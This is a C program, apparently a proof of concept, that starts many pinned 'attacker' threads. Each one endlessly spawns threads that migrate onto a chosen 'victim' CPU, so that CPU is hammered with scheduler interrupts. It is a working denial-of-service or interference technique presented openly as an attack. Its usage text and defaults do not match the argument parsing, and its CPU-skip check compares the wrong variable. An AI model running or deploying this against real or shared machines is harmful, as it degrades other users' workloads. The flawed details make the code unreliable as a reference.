#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sched.h>
#include <string.h>
#include <errno.h>
#include <time.h>

int NUM_THREADS = 22;
int VICTIM_CPU = 0;
int DURATION = 10;
static volatile int running = 1;
static unsigned long total_migrations = 0;

void* migrate_and_exit(void* arg) {
    cpu_set_t victim_mask;
    CPU_ZERO(&victim_mask);
    CPU_SET(VICTIM_CPU, &victim_mask);

    if (sched_setaffinity(0, sizeof(cpu_set_t), &victim_mask) == 0) {
        __sync_fetch_and_add(&total_migrations, 1);
    }
    return NULL;
}

void pin_cpu(int cpu)
{
    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(cpu, &mask);
    if (sched_setaffinity(0, sizeof(cpu_set_t), &mask) == -1) {
        perror("sched_setaffinity");
        exit(EXIT_FAILURE);
    }
}


void* attacker_thread(void* arg) {
    int cpu_num = *(int*)arg;
    pin_cpu(cpu_num);
    
    while (running) {
        pthread_t thread;
        if (pthread_create(&thread, NULL, migrate_and_exit, NULL) == 0) {
            pthread_detach(thread);
        }
    }
    return NULL;
}

void print_usage(const char *program_name) {
    printf("Usage: %s [DURATION_SEC] [VICTIM_CPU]\n", program_name);
    printf("  DURATION_SEC  Test duration in seconds (default: 5)\n");
    printf("  VICTIM_CPU    CPU to target with IPIs (default: 0)\n");
}

int main(int argc, char *argv[]) {
    int duration_sec = 5;
    
    if (argc >= 2) {
        NUM_THREADS = atoi(argv[1]);
        if (NUM_THREADS <= 0) {
            fprintf(stderr, "Error: NUM_THREADS must be positive\n");
            return EXIT_FAILURE;
        }
    }

    if (argc >= 3) {
        DURATION = atoi(argv[2]);
        if (DURATION <= 0) {
            fprintf(stderr, "Error: TEST_DURATION must be positive\n");
            return EXIT_FAILURE;
        }
    }

    int num_cpus = sysconf(_SC_NPROCESSORS_ONLN);
    if (argc >= 4) {
        VICTIM_CPU = atoi(argv[3]);
        if (VICTIM_CPU < 0 || VICTIM_CPU >= num_cpus) {
            fprintf(stderr, "Error: TARGET_CPU must be between 0 and %d\n", num_cpus - 1);
            return EXIT_FAILURE;
        }
    }

    printf("System has %d CPUs available\n", num_cpus);
    printf("Launching %d attacker threads to hammer CPU %d for %d seconds...\n",
           NUM_THREADS, VICTIM_CPU, DURATION);

    pthread_t attackers[NUM_THREADS];
    int thread_nums[NUM_THREADS];

    // Launch attacker threads
    for (int i = 0; i < NUM_THREADS; i++) {
        if(NUM_THREADS != VICTIM_CPU){
            thread_nums[i] = i;
            if (pthread_create(&attackers[i], NULL, attacker_thread, &thread_nums[i]) != 0) {
                perror("pthread_create");
                return EXIT_FAILURE;
            }
        }
    }

    // Run for specified duration
    sleep(DURATION);
    running = 0;
    printf("Attack complete. Total migration attempts: %lu\n", total_migrations);
    
    return EXIT_SUCCESS;
}